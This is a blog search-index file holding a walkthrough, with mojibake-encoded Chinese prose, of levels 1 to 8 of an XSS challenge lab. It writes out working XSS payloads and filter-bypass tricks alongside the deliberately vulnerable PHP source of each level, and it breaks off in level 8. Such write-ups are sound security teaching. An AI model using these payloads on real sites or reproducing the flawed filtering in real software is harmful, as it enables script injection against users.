<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSSæŒ‘æˆ˜ä¹‹æ—…</title>
      <link href="/2019/05/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/"/>
      <url>/2019/05/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><h3 id="æ²¡æœ‰ä»»ä½•è¿‡æ»¤"><a href="#æ²¡æœ‰ä»»ä½•è¿‡æ»¤" class="headerlink" title="æ²¡æœ‰ä»»ä½•è¿‡æ»¤"></a>æ²¡æœ‰ä»»ä½•è¿‡æ»¤</h3><p>æ ¹æ®æç¤ºç‚¹å‡»å›¾ç‰‡</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558054268267.png" alt="1558054268267"></p><p>è·³è½¬åˆ°å¦‚ä¸‹é¡µé¢</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558054405501.png" alt="1558054405501"></p><p>å‘ç°urlé€šè¿‡getæ–¹æ³•ä¼ é€’å‚æ•°</p><p>ä¿®æ”¹å‚æ•°ä¸º666</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558054498678.png" alt="1558054498678"></p><p>å‘ç°åœ¨é¡µé¢ä¸­æœ‰è¾“å‡ºç›¸åº”å†…å®¹ï¼Œå¯ä»¥çœ‹å‡ºæ— éœ€é—­åˆåŒå¼•å·ï¼Œæ„é€ å¦‚ä¸‹payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level1.php?name=&lt;/h2&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;h2&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558054637265.png" alt="1558054637265"></p><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼ŒæˆåŠŸæ‰§è¡Œpayload</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼šæ²¡æœ‰åšä»»ä½•è¿‡æ»¤</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><h3 id="éƒ¨åˆ†è¿‡æ»¤"><a href="#éƒ¨åˆ†è¿‡æ»¤" class="headerlink" title="éƒ¨åˆ†è¿‡æ»¤"></a>éƒ¨åˆ†è¿‡æ»¤</h3><p>è¾“å…¥å†…å®¹666</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558054961618.png" alt="1558054961618"></p><p>å‘ç°æœ‰ä¸¤å¤„è¾“å‡ºç›¸åº”å†…å®¹çš„åœ°æ–¹ï¼Œç¬¬ä¸€å¤„å’Œä¸Šä¸€å…³ç›¸åŒï¼Œå°è¯•ä¸‹åŒä¸€paylaod</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558055118753.png" alt="1558055118753"></p><p>å‘ç°<code>&lt;&gt;</code>è¢«å®ä½“åŒ–è½¬ä¹‰æ‰äº†ï¼Œè¿™ä¸€å¤„æ— æ³•å†è¿›è¡Œæ„é€ äº†ã€‚</p><p>æ¥ä¸‹æ¥å¯¹å¦ä¸€å¤„è¿›è¡Œæ„é€ </p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558055268881.png" alt="1558055268881"></p><p>å‘ç°<code>&lt;&gt;</code>æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œæ„é€ å¦‚ä¸‹payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558055385539.png" alt="1558055385539"></p><p>æˆåŠŸæ‰§è¡Œpayloadï¼Œä¾¿äºæŸ¥çœ‹ä»£ç ï¼Œæˆ‘æŠŠalertå»æ‰</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558055539475.png" alt="1558055539475"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸé—­åˆå‰åæ ‡ç­¾ï¼Œæ‰€ä»¥scriptæ ‡ç­¾é‡Œçš„jsä»£ç å¯ä»¥æˆåŠŸæ‰§è¡Œ</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="æœç´¢"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>æœ‰ä¸¤ä¸ªè¾“å‡ºï¼Œç¬¬ä¸€ä¸ªè¾“å‡ºä½¿ç”¨htmlspeciachars()è¿›è¡Œè½¬ä¹‰ï¼Œç¬¬äºŒä¸ªæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå¯ä»¥åœ¨è¿™é‡Œè¿›è¡Œæ„é€ payloadã€‚</p><p>ä¸¤ç§æ–¹æ³•ï¼š</p><ol><li><p>ä¸é€ƒé€¸inputæ ‡ç­¾ï¼Œé—­åˆå¼•å·æ·»åŠ äº‹ä»¶è§¦å‘xss</p><p>é¼ æ ‡ç§»åŠ¨è‡³è¯¥æ ‡ç­¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>ç‚¹å‡»è§¦å‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>ç‚¹å‡»è¾“å…¥æ¡†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>ç­‰ç­‰å¾ˆå¤šäº‹ä»¶ï¼Œè¿™é‡Œè´´ä¸ªç½‘ä¸Šçš„é“¾æ¥<a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p></li><li><p>é€ƒé€¸å‡ºinputæ ‡ç­¾,ä½¿ç”¨å…¶ä»–æ ‡ç­¾è§¦å‘xss</p><p><code>&lt;script&gt;</code>æ ‡ç­¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code>æ ‡ç­¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;//</span><br></pre></td></tr></table></figure><p><code>&lt;a&gt;</code>æ ‡ç­¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;&quot; onmouseover=&quot;alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br></pre></td></tr></table></figure><p>ç­‰ç­‰</p></li></ol><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><h3 id="å®ä½“åŒ–è½¬ä¹‰ç»•è¿‡"><a href="#å®ä½“åŒ–è½¬ä¹‰ç»•è¿‡" class="headerlink" title="å®ä½“åŒ–è½¬ä¹‰ç»•è¿‡"></a>å®ä½“åŒ–è½¬ä¹‰ç»•è¿‡</h3><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558056793437.png" alt="1558056793437"></p><p>çœ‹èµ·æ¥è·Ÿlevelä¸€æ ·ï¼Œè¯•ä¸€ä¸‹é—­åˆæ‰valueå±æ€§</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558057130653.png" alt="1558057130653"></p><p>é—­åˆè¯­å¥è™½ç„¶æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯çœ‹èµ·æ¥è¢«è½¬ä¹‰æ‰äº†</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558056967968.png" alt="1558056967968"></p><p>åŒå¼•å·è¢«è½¬ä¹‰ï¼Œå†å°è¯•ä¸€ä¸‹å•å¼•å·<code>&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558057294923.png" alt="1558057294923"></p><p>å¯ä»¥çœ‹å‡ºæ¥ <code>value=&quot;&quot;</code> æˆåŠŸé—­åˆï¼Œä½†æ˜¯ <code>&lt;&gt;</code> ä¾æ—§è¢«è½¬ä¹‰</p><p>å†å°è¯•å¦ä¸€ç§åŠæ³•ï¼Œæ·»åŠ äº‹ä»¶å±æ€§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmouseover=&apos;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558057537275.png" alt="1558057537275"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸè§¦å‘äº‹ä»¶å±æ€§é‡Œçš„jsä»£ç </p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>ä¸¤ä¸ªè¾“å‡ºç‚¹éƒ½åšäº†htmlspecialchars()è½¬ä¹‰ï¼Œä½†æ˜¯ç¬¬äºŒä¸ªæ‹¼æ¥çš„è¯­å¥ä½¿ç”¨äº†å•å¼•å·<code>&#39;</code>ï¼Œè€Œä¸”htmlspecialchars()å‡½æ•°ä½¿ç”¨é»˜è®¤å‚æ•°ä¸ä¼šå¯¹å•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨å•å¼•å·é—­åˆå‰é¢çš„å±æ€§</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><h3 id="äº‹ä»¶å±æ€§é€ƒé€¸"><a href="#äº‹ä»¶å±æ€§é€ƒé€¸" class="headerlink" title="äº‹ä»¶å±æ€§é€ƒé€¸"></a>äº‹ä»¶å±æ€§é€ƒé€¸</h3><p>è·Ÿä¸Šå…³å¾ˆåƒï¼Œè¯•ä¸€ä¸‹é—­åˆæ ‡ç­¾</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558057712688.png" alt="1558057712688"></p><p>å‘ç°<code>&lt;&gt;</code>å…¨éƒ¨è¢«è¿‡æ»¤æ‰äº†ï¼Œé‚£å°±ä½¿ç”¨äº‹ä»¶å±æ€§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œpayload</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558096380758.png" alt="1558096380758"></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>ç¬¬äºŒä¸ªè¾“å‡ºç‚¹å¯¹<code>&lt;&gt;</code>è¿›è¡Œäº†æ›¿æ¢ï¼Œä½¿ç”¨äº‹ä»¶å±æ€§è¿›è¡Œæ„é€ payload</p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><h3 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h3><p>æ„é€ å¦‚ä¸‹payload</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558096540426.png" alt="1558096540426"></p><p>å‘ç°åªæœ‰scriptè¢«å’Œè°äº†ï¼Œ ~ o(<em>ï¿£â–½ï¿£</em>)ãƒ–</p><p>ä½¿ç”¨é<code>&lt;script&gt;</code>çš„htmlæ ‡ç­¾ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed src=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558098248009.png" alt="1558098248009"></p><p>ä½¿ç”¨è§¦å‘äº‹ä»¶ç»•è¿‡</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558098351438.png" alt="1558098351438"></p><p>å‘ç°onè¢«è¿‡æ»¤ï¼Œå¤§å°å†™ä¹Ÿä¸è¡Œï¼Œæš‚æ²¡æœ‰æ‰¾åˆ°ä¸ç”¨onçš„ğŸ˜‚</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>é¦–å…ˆä½¿ç”¨strtolower()å‡½æ•°æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼Œç„¶åå¯¹<code>&lt;script</code>å’Œ<code>on</code>è¿›è¡Œreplaceæ›¿æ¢ï¼Œé‚£å°±ç”¨ä¸äº†äº‹ä»¶å±æ€§äº†ï¼Œåªèƒ½ä½¿ç”¨é—­åˆæ ‡ç­¾çš„æ–¹å¼</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><p>scriptè¢«è¿‡æ»¤</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558100639552.png" alt="1558100639552"></p><p>srcè¢«è¿‡æ»¤</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558100187489.png" alt="1558100187489"></p><p>hrefè¢«è¿‡æ»¤</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558100233619.png" alt="1558100233619"></p><p>onè¢«è¿‡æ»¤ï¼Œäº‹ä»¶å±æ€§ä¸è¡Œäº†</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558100422464.png" alt="1558100422464"></p><p>æœ‰ä¸€ç‚¹ç‚¹å°¬ä½äº†ï¼Œçœ‹ä¸€ä¸‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ä½¿ç”¨strtolower()å‡½æ•°ï¼Œå¯ä»¥å¤§å°å†™ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed SRC=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot; Onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558102420262.png" alt="1558102420262"></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><h3 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h3><p>è¯•ä¸€ä¸‹äº‹ä»¶å±æ€§</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558105060724.png" alt="1558105060724"></p><p>onæ²¡äº†ï¼Œè¢«æ›¿æ¢ä¸ºç©ºï¼Œæ¥ç€è¯•ä¸€ä¸‹æ ‡ç­¾é€ƒé€¸</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558105341248.png" alt="1558105341248"></p><p>srcå’Œscriptä¹Ÿæ²¡äº†</p><p>æƒ³åˆ°äº†åŒå†™ï¼ŒæˆåŠŸç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed ssrcrc=javasscriptcript:alert(/XSS/);&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558105662485.png" alt="1558105662485"></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>æ›¿æ¢äº†ä¸€ç³»åˆ—å…³é”®å­—ï¼Œä½†æ˜¯å´æ›¿æ¢ä¸ºç©ºå€¼ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨åŒå†™ç»•è¿‡</p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><h3 id="å±æ€§å€¼ç¼–ç ç»•è¿‡"><a href="#å±æ€§å€¼ç¼–ç ç»•è¿‡" class="headerlink" title="å±æ€§å€¼ç¼–ç ç»•è¿‡"></a>å±æ€§å€¼ç¼–ç ç»•è¿‡</h3><p>è¿™å…³æœ‰ç‚¹ä¸ä¸€æ ·äº†</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558105893509.png" alt="1558105893509"></p><p>è¯•ä¸€ä¸‹æ ‡ç­¾é€ƒé€¸</p><p><img 